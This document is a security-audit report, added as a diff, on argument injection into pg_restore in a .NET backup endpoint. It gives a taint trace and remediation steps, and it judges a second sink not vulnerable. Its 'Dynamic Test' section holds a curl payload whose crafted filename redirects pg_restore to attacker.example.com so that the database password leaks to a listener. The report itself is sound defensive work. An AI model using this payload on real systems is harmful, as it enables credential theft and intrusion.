@@ -1,0 +1,39 @@
+# RCE Analysis Results: Kumburgaz
+
+## Executive Summary
+- Sinks analyzed: 2
+- Vulnerable: 0
+- Likely Vulnerable: 1
+- Not Vulnerable: 1
+- Needs Manual Review: 0
+
+## Findings
+
+### [LIKELY VULNERABLE] pg_restore invocation with uploaded-filename-derived path in args
+- **File**: `Services/BackupService.cs` (lines 60-73, 129-153, 155-194); `Controllers/BackupsController.cs` (lines 45-82)
+- **Endpoint / function**: `BackupService.RestoreAsync(string filePath, ...)`, invoked from `BackupsController.Restore(IFormFile? file)` (`POST /Backups/Restore`, `[Authorize(Policy = AppPolicies.SystemAdmin)]`, `[ValidateAntiForgeryToken]`).
+- **Category**: OS Command Injection (argument injection via unescaped quoting in `ProcessStartInfo.Arguments`)
+- **Issue**: `BackupsController.Restore` builds `tempPath = Path.Combine(tempDir, $"{Guid.NewGuid():N}-{Path.GetFileName(file.FileName)}")` (line 57). `Path.GetFileName` strips path separators (`/`, `\`) but does **not** strip or escape any other character, including `"`. This `tempPath` is passed as `filePath` to `RestoreAsync`, which forwards it unchanged into `BuildPgRestoreArgs(connectionString, filePath)` → `$"{BuildPgConnectionArgs(connectionString)} --clean --if-exists \"{source}\""` (line 131). Because `ProcessStartInfo.Arguments` is a single string that .NET re-splits into argv using Windows `CommandLineToArgvW`-style quoting rules (this applies even though `UseShellExecute = false` — the re-parsing is done by .NET/the OS process-creation layer, not a shell), an embedded `"` followed by whitespace in the uploaded filename can close the intended quoted argument early and inject additional whitespace-separated tokens that `pg_restore` will parse as new flags (e.g. `-h`, `-p`, `-U`, `-d`, or other `pg_restore` options).
+- **Taint trace**:
+  1. `IFormFile file` in `Restore(IFormFile? file)` — `file.FileName` is read directly from the client-supplied `Content-Disposition: form-data; name="file"; filename="..."` header of the multipart request.
+  2. `Path.GetFileName(file.FileName)` (line 57) — only strips directory-separator-prefixed segments; passes through all other characters (including `"`, spaces, dashes) verbatim.
+  3. `tempPath` (embeds the above) is written straight through to `RestoreAsync(tempPath)` (line 66) → `BuildPgRestoreArgs(connectionString, filePath)` (line 72) → interpolated into the `--if-exists "{source}"` segment of the argument string (line 131) → `ProcessStartInfo(fileName, arguments)` (line 157) → `Process.Start(start)` (line 176).
+  4. Deliverability of `"` in `file.FileName`: ASP.NET Core's multipart parser (`Microsoft.Net.Http.Headers.ContentDispositionHeaderValue`) treats the `filename` parameter as an RFC 6266 quoted-string and unescapes backslash-escaped characters when decoding it (e.g. a client-sent header value `filename="test\".dump"` is decoded to the literal `test".dump`, and `IFormFile.FileName` exposes that decoded value). This does not require going through an OS file-picker/browser upload dialog — an attacker crafting the raw multipart POST body directly (e.g. via `curl`, Burp, or a script) fully controls the raw header bytes and can supply an embedded quote plus a space plus arbitrary flag text.
+- **Impact**: This is argument injection, not shell injection (no `;`/`|`/`&&` shell metacharacter interpretation occurs since `UseShellExecute = false` and there is no intermediate shell). The practical impact is limited to *additional or altered `pg_restore` command-line flags* being appended after the injected `"` + whitespace, for example re-specifying `-h`, `-p`, `-U`, or `-d` to point `pg_restore` at an attacker-controlled PostgreSQL listener. Because `RunProcessAsync` sets `PGPASSWORD` from the real `DefaultConnection` password into the child process environment (lines 164-171) *before* the injected flags are parsed by `pg_restore`, redirecting `-h`/`-p` to an attacker-controlled host would cause `pg_restore` to attempt authentication (using the real `PGPASSWORD`) against that attacker-controlled server — leaking the production database password (or at minimum a captured SCRAM/MD5 auth exchange). This crosses a privilege boundary: an attacker who can reach the `Restore` endpoint gains the ability to exfiltrate the database credential and control `pg_restore` process arguments beyond what the file-upload UI intends — disclosing a secret the SystemAdmin UI itself never displays. Separately/independently: since the attacker (already required to be an authenticated SystemAdmin) also fully controls the *content* of the uploaded dump/backup file, and `pg_restore` executes arbitrary statements from a custom-format dump (including, on a sufficiently privileged PostgreSQL role, `COPY ... FROM PROGRAM 'command'`), this endpoint already grants a path to OS command execution as the PostgreSQL server process via dump content alone, regardless of the filename-quoting bug — the argument-injection issue is an *additional* credential-exfiltration/parameter-tampering vector layered on top of that pre-existing trusted-admin capability.
+- **Remediation**:
+  1. Switch `RunProcessAsync`/`ProcessStartInfo` from the `Arguments` string to `ArgumentList` (e.g. `start.ArgumentList.Add("--if-exists"); start.ArgumentList.Add(source);`) for all of `BuildPgDumpArgs`, `BuildPgRestoreArgs`, and `BuildPgConnectionArgs` — this passes each argument as a discrete token with no re-parsing, eliminating the injection class entirely.
+  2. Do not derive any part of the on-disk temp filename from `file.FileName`; use only `Guid.NewGuid()` (or a fixed extension like `.dump`) for the temp path, and treat the original filename as a display-only label if needed.
+  3. Validate/reject filenames containing `"` or other non-alphanumeric characters before use, as defense in depth.
+- **Dynamic Test**:
+  ```
+  curl -X POST https://target/Backups/Restore \
+    -H "Cookie: <systemadmin-auth-cookie>" \
+    -F "__RequestVerificationToken=<csrf-token>" \
+    -F 'file=@payload.dump;filename="a\" -h attacker.example.com -p 5432 -U probe -d x --clean --if-exists \"b.dump"'
+  ```
+  Then observe (via a netcat/pg-protocol listener on `attacker.example.com:5432`) whether a PostgreSQL connection/auth attempt arrives carrying the real `PGPASSWORD`-derived auth exchange, confirming the injected `-h`/`-p` flags were honored by `pg_restore`.
+
+### [NOT VULNERABLE] pg_dump invocation with interpolated connection/filename args
+- **File**: `Services/BackupService.cs` (lines 39-58, 124-127, 141-153, 155-194)
+- **Endpoint / function**: `BackupService.CreateBackupAsync(string reason, ...)` — called from `BackupsController.Create()` (`POST /Backups/Create`, `[Authorize(Policy = AppPolicies.SystemAdmin)]`, `[ValidateAntiForgeryToken]`) and internally from `BackupService.RestoreAsync` (pre-restore safety backup) and presumably `BackupHostedService` (scheduled job).
+- **Reason**: `reason` is interpolated unescaped into the backup filename (`kumburgaz-{reason}-{stamp}.dump`, line 55) and then into the `pg_dump` argument string (`-Fc -f "{target}"`, line 126), and `connectionString` fields are also interpolated unescaped via `BuildPgConnectionArgs`, sharing the same latent argument-injection pattern as the `pg_restore` sink above. However, every call site of `CreateBackupAsync` was traced: `BackupsController.Create()` calls it with the hardcoded literal `"manuel"`; `BackupService.RestoreAsync()` calls it with the hardcoded literal `"restore-oncesi"`. The `Create()` action itself takes no parameters — it is a bare `[HttpPost]` with no user-controllable input. `connectionString` fields come from `IConfiguration.GetConnectionString("DefaultConnection")` (app config), not runtime user input. No reachable taint path from any external input exists today. Flagged for defense-in-depth only: the unescaped-quoting pattern would become exploitable if a future change ever threads user input into `reason`.
